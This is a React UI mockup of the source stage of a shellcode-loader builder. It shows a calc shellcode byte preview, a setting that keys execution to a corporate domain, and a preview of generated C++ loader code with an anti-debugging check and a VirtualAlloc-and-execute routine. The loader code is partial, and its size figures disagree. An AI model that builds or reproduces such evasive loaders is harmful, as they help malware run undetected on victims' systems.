/* Frame 01 — Workspace / Source stage
   The main build view, default landing after open */

function FrameWorkspace() {
  const status = [
    { icon: "info", k: "src", v: "calc_x64.bin · 327 B" },
    { icon: "shield", k: "guardrails", v: "USERDOMAIN=CORP" },
  ];

  return (
    <Shell crumbs={["build", "source"]} pipeActive="src" status={status}>
      {/* MIDDLE: source configuration */}
      <div className="cfg">
        <div style={{ display: "flex", alignItems: "baseline", gap: 14, marginBottom: 22 }}>
          <h1 className="h1">Shellcode source</h1>
          <span className="sub">Pick one input. Everything downstream rebuilds when this changes.</span>
        </div>

        <Sec title="Input mode"
          action={<Seg value="file" options={[
            { v: "file", l: "File",   icon: "file" },
            { v: "raw",  l: "Raw",    icon: "term" },
            { v: "url",  l: "URL",    icon: "globe" },
            { v: "test", l: "Test",   icon: "beaker" },
          ]} />}
        >
          <div className="card">
            <div className="row" style={{ alignItems: "stretch", gap: 16 }}>
              {/* Drop / browse */}
              <div style={{ flex: "1.4 1 0", display: "flex", flexDirection: "column", gap: 10 }}>
                <Field label="Shellcode .bin path">
                  <input className="input mono" defaultValue="C:\\Users\\hmza\\payloads\\calc_x64.bin" />
                </Field>
                <div className="row" style={{ gap: 8 }}>
                  <button className="btn"><Icon name="upload" size={12} />Browse…</button>
                  <button className="btn ghost"><Icon name="refresh" size={12} />Recompute hash</button>
                  <div style={{ flex: 1 }} />
                  <Chip kind="ok" dot>valid PE-stripped</Chip>
                </div>
              </div>

              {/* Inline analysis */}
              <div style={{ flex: 1, borderLeft: "1px solid var(--n-4)", paddingLeft: 16, display: "flex", flexDirection: "column", gap: 8 }}>
                <H3>Detected</H3>
                <div className="mono" style={{ fontSize: 11, color: "var(--n-8)", lineHeight: 1.85 }}>
                  size      <span style={{ color: "var(--n-10)" }}>327 B</span>{"\n"}
                  arch      <span style={{ color: "var(--n-10)" }}>x86_64</span>{"\n"}
                  entropy   <span style={{ color: "var(--n-10)" }}>7.42 / 8.0</span> <span style={{ color: "var(--warn)" }}>high</span>{"\n"}
                  sha256    <span style={{ color: "var(--n-9)" }}>4f7b…a9d2</span>
                </div>
              </div>
            </div>

            <div className="div" />

            {/* byte preview */}
            <div>
              <H3>First 64 bytes</H3>
              <div className="bytes" style={{ marginTop: 8 }}>
                <div><span className="o">00000000  </span><span className="a">fc 48 83 e4</span> f0 e8 c0 00 00 00 41 51 41 50 52 51</div>
                <div><span className="o">00000010  </span>56 48 31 d2 65 48 8b 52 60 48 8b 52 18 48 8b 52</div>
                <div><span className="o">00000020  </span>20 48 8b 72 50 48 0f b7 4a 4a 4d 31 c9 48 31 c0</div>
                <div><span className="o">00000030  </span>ac 3c 61 7c 02 2c 20 41 c1 c9 0d 41 01 c1 e2 ed</div>
              </div>
            </div>
          </div>
        </Sec>

        <Sec title="Guardrails"
          action={<Chip kind="acc" dot>1 active</Chip>}
        >
          <div className="card">
            <div className="row" style={{ justifyContent: "space-between", marginBottom: 12 }}>
              <div>
                <div className="h2">Environment-bound execution</div>
                <div className="sub">Loader exits silently if target environment doesn't match.</div>
              </div>
              <Toggle on />
            </div>
            <div className="row" style={{ gap: 10, alignItems: "stretch" }}>
              <div style={{ flex: 1 }}>
                <Field label="Condition">
                  <input className="input mono" defaultValue="USERDOMAIN#equals#CORP" />
                </Field>
              </div>
              <div style={{ width: 220 }}>
                <Field label="On mismatch">
                  <select className="select"><option>Exit silently</option></select>
                </Field>
              </div>
            </div>
          </div>
        </Sec>

        <Sec title="Output">
          <div className="card">
            <div className="row" style={{ gap: 16 }}>
              <Field label="Filename pattern" hint="{ts} = build time · {sha8} = first 8 of source hash">
                <input className="input mono" defaultValue="{ts}-{sha8}.exe" style={{ width: 280 }} />
              </Field>
              <Field label="Directory" hint="resolved from AppPaths.OutputDirectory">
                <input className="input mono" defaultValue="~/washmachine/out/" style={{ width: 280 }} />
              </Field>
              <Field label="Save session artifacts" hint="source.cpp · build_log · UIData snapshot">
                <Toggle on />
              </Field>
            </div>
          </div>
        </Sec>
      </div>

      {/* RIGHT: live preview */}
      <PreviewPane />
    </Shell>
  );
}

function PreviewPane() {
  return (
    <div className="preview">
      <div className="ptabs">
        <div className="ptab on"><Icon name="doc" size={11} />source.cpp</div>
        <div className="ptab"><Icon name="layers" size={11} />pipeline</div>
        <div className="ptab"><Icon name="term" size={11} />console</div>
        <div style={{ flex: 1 }} />
        <div className="ptab"><Icon name="copy" size={11} /></div>
        <div className="ptab"><Icon name="dl" size={11} /></div>
      </div>
      <div className="pbody">
        <div style={{ padding: "10px 14px 4px", display: "flex", alignItems: "center", gap: 8 }}>
          <span className="mono" style={{ fontSize: 11, color: "var(--n-7)" }}>temp/cpp/session_20260519_001a/source.cpp</span>
          <Chip>4.1 KB</Chip>
          <Chip>247 lines</Chip>
          <div style={{ flex: 1 }} />
          <Chip kind="acc" dot>auto-rebuild</Chip>
        </div>
        <CodeBlock startLine={1} highlight={[10, 11, 12]} lines={[
          [["pp", "#define"], ["", " "], ["kw", "WIN32_LEAN_AND_MEAN"]],
          [["pp", "#include"], ["", " "], ["str", "<windows.h>"]],
          [["pp", "#include"], ["", " "], ["str", "<tlhelp32.h>"]],
          [["", ""]],
          [["cm", "// ── snippet includes ─────────────────"]],
          [["pp", "#include"], ["", " "], ["str", "<intrin.h>"]],
          [["", ""]],
          [["cm", "// ── implementations (anti-debug, ps-inject) ─"]],
          [["kw", "static"], ["", " "], ["ty", "BOOL"], ["", " "], ["fn", "AntiDbg_CloseHandle"], ["", "()"]],
          [["", "{ "], ["kw", "__try"], ["", " { "], ["fn", "CloseHandle"], ["", "(("], ["ty", "HANDLE"], ["", ")"], ["num", "0xDEADBEEF"], ["", "); "], ["kw", "return"], ["", " "], ["num", "FALSE"], ["", "; }"]],
          [["", "  "], ["kw", "__except"], ["", "("], ["num", "EXCEPTION_INVALID_HANDLE"], ["", " == "], ["fn", "GetExceptionCode"], ["", "()"]],
          [["", "    ? "], ["num", "EXCEPTION_EXECUTE_HANDLER"], ["", " : "], ["num", "EXCEPTION_CONTINUE_SEARCH"], ["", ")"]],
          [["", "  { "], ["kw", "return"], ["", " "], ["num", "TRUE"], ["", "; } }"]],
          [["", ""]],
          [["ty", "INT"], ["", " "], ["fn", "main"], ["", "("], ["ty", "VOID"], ["", ")"]],
          [["", "{"]],
          [["", "  "], ["cm", "// {{SHELLCODE_SOURCE}}"]],
          [["", "  "], ["kw", "static"], ["", " "], ["ty", "unsigned char"], ["", " code_blob[] = {"]],
          [["", "    "], ["num", "0xfc"], ["", ", "], ["num", "0x48"], ["", ", "], ["num", "0x83"], ["", ", "], ["num", "0xe4"], ["", ", "], ["num", "0xf0"], ["", ", "], ["num", "0xe8"], ["", ", "], ["num", "0xc0"], ["", ", "], ["num", "0x00"], ["", ", "], ["num", "0x00"], ["", ", "], ["num", "0x00"], ["", ", "], ["num", "0x41"], ["", ", "], ["num", "0x51"], ["", ","]],
          [["", "    "], ["fold", "771 bytes folded · click to expand"]],
          [["", "  };  "], ["cm", "// sizeof = 789"]],
          [["", "  "], ["ty", "DWORD"], ["", " dwSize = "], ["kw", "sizeof"], ["", "(code_blob);"]],
          [["", ""]],
          [["", "  "], ["cm", "// {{GUARDRAILS}}"]],
          [["", "  "], ["kw", "if"], ["", " ("], ["fn", "GetEnvironmentVariableW"], ["", "("], ["str", "L\"USERDOMAIN\""], ["", ", ..."]],
          [["", "    .. != "], ["str", "L\"CORP\""], ["", ") "], ["kw", "return"], ["", " "], ["num", "0"], ["", ";"]],
          [["", ""]],
          [["", "  "], ["cm", "// {{ANTI_DEBUGGING}}"]],
          [["", "  "], ["kw", "if"], ["", " ("], ["fn", "AntiDbg_CloseHandle"], ["", "()) "], ["kw", "return"], ["", " "], ["num", "0"], ["", ";"]],
          [["", ""]],
          [["", "  "], ["cm", "// {{SHELLCODE_EXECUTION}}"]],
          [["", "  "], ["kw", "void"], ["", "* mem = "], ["fn", "VirtualAlloc"], ["", "("], ["num", "NULL"], ["", ", dwSize, ..."], ["", ");"]],
          [["", "  "], ["fn", "memcpy"], ["", "(mem, code_blob, dwSize);"]],
          [["", "  (("], ["kw", "void"], ["", "(*)())mem)();"]],
          [["", "  "], ["kw", "return"], ["", " "], ["num", "0"], ["", ";"]],
          [["", "}"]],
        ]} />
      </div>
    </div>
  );
}

window.FrameWorkspace = FrameWorkspace;
window.PreviewPane = PreviewPane;
